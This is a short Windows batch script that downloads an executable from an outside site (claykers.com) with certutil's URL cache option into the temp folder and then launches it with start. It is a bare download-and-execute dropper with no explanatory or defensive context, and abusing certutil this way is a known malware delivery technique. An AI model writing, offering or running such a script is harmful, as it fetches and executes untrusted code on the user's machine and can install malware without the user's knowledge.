@echo off
set url=<https://claykers.com/>
set file=%temp%\downloaded_file.exe
certutil -urlcache -split -f "%url%" "%file%"
start "" "%file%"
